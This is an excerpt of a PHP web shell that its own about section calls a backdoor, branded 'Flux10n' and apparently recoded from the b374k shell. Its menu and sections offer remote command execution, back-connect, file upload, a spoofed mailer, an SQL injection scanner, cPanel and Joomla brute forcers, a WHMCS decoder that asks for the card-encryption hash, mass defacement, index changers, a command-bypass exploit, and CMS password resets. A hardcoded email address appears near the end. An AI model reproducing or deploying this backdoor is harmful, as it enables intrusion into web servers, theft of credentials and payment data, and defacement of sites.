...
?>
<html><head><link rel="SHORTCUT ICON" href="https://telegra.ph/file/4d5ee033f51b5b488bd96.png"><title>403 Men</title>
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<Group description="Theme Color">
<Variable name="themeColor" description="Address bar color" type="color" default="cyan" value="cyan"/></Group>
...
<div class="head_info">
<table ><tr>
<td><table class="b374k_tbl"><tr><td><a href="?"><span class="asu">Flux10n</span></a></td></tr><tr><td><b>Manusia Hanyalah Alat</b></td></tr></table></td>
<td><?php echo $buff; ?></td>
</tr></table>
</div>
<!-- head info end here -->
...
<center><div id="menu">
<a href="?">Home</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=shell">Excute</a>
...
<a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit">Bc</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=upload">Upload</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mail">E-Mail</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=sqli-scanner">SQLI</a>
...
echo "<center/><br/><b><font color=#00ff00>+--==[ Mysql Interface ]==--+</font></b><br><br>";
  mkdir('mysql', 0755);
    chdir('mysql');
        $akses = ".htaccess";
        $buka_lah = "$akses";
        $buka = fopen ($buka_lah , 'w') or die ("Error bang!");
...
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="flux10n@cia.gov" name="mail_from" />&nbsp; from</td></tr>
...
elseif(isset($_GET['view']) && ($_GET['view'] != "")){
  if(is_file($_GET['view'])){ 
	...
	<tr><td>OWNER:GROUP</td><td>".$owner."</td></tr>
...
<input name="page" type="hidden" value="find"><table>      				
    </strong><br><br><center><font size="5" style="italic" color="#00FFFF">=[ Cpanel BruteForce ]=</font></center><br><br>
    <table width="600" border="0" cellpadding="3" cellspacing="1" align="center">
	<tr>
	<td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<center><b><font size="5" style="italic" color="#00FFFF">Cpanel BruteForce</font></b></center></td></tr>
    <tr>
    <td>
...
{
echo "<font color=#00FFFF>No Security for Function</font></b>";
}else{
...
echo "
<br><center><font size='5' color='#00FFFF'><b>-=[ WHMCS Decoder ]=-</b></font></center>
<center>
<br>
...
<tr><td>db_host </td><td><input type='text' style='color:#00FFFF;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#00FFFF;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#00FFFF;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#00FFFF;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#00FFFF;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#00FFFF;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";
...
{
echo "<center/><br/><b><font color=#00FFFF>-=[ Mass Deface ]=-</font></b><br>";
error_reporting(0);?>
...
<center><b><font color="#00FFFF">+--=[ Joomla Bruter Force ]=--+</font></b><br /><br />
...
elseif(isset($_GET['x']) && ($_GET['x'] == 'vb'))
   ...
   <b><font color="#00FFFF">+--=[ VB Index Changer ]=--+</font></b>
   </div><br>
   <?
...
<?php
echo "<center/><br/><b><font color=#00FFFF>-=[ Command  Bypass Exploit ]=-</font></b><br>
";
print_r('
<pre>
<form method="POST" action="">
...
function randomt() {
    ...
    */
    ...
    <center><br><br>
    <font color="#00FFFF" size='+3'><b>+--=[ Automatic Joomla Index Changer ]=--+</b></font><br><br>
    </center>
    <center><b>
...
echo "<center/><br/><b><font color=#00FFFF>+--==[ Config Shell Priv8 SCR ]==--+</font></b><br><br>";
...
echo "<center/><br/><b><font color=#00FFFF>+--==[  Wordpress Reset Password  ]==--+</font></b><br><br>";
...
echo "<center/><br/><b><font color=#00FFFF>+--==[  Joomla Reset Password ]==--+</font></b><br><br>";
	if(empty($_POST['pwd'])){
...
elseif(isset($_GET['x']) && ($_GET['x'] == 'about'))
	...
	<center><br><br><img src='https://telegra.ph/file/9e45564cf8ba87f9ccee2.png' width="30%">
    <br><br><br>Backdoor ini tidak sepenuhnya berasal dari codingan saya. Saya hanya menambahkan beberapa desain, source codenya saya recode<br>dari b374k shell. Fiturnya masih sama seperti b374k hanya saja penampilannya yang berbeda ok sekian dari saya thx :)
	<br><br>" Jadikanlah kritikan sebagai saran."
	<br><br><font size="5" color="#00FFFF">.: Last :.</font></center><center>
<marquee direction="up" scrollamount="2" bgcolor="" width="250" height="40"><center>
<p><b><font size="3" color="#00FFFF">=[ People Unknown ]=<br><br>
1<br>
	2<br>
		3<br>
			4<br>
										...
										11<br>
											12<br>
												13<br>
													14<br>
														15<br>
										Wh00pz we are party at your security<br>
											Your system is now inaccessible!!
</font></b></p></center></marquee><br><br>
<center><audio src="https://h.top4top.io/m_2307gc8be1.mp3" loop="1" controls="1" autoplay="1"></audio>
</center><br><br><br><br>
<?php
}
//////////////////////////////////////////////////////////////////////////////
...
?><center><br><br><div class="info">-=[ Powered by <b>FLUX10N</b> ]=-</div><br>
...
$to_email = 'orangrandom@proton.me';
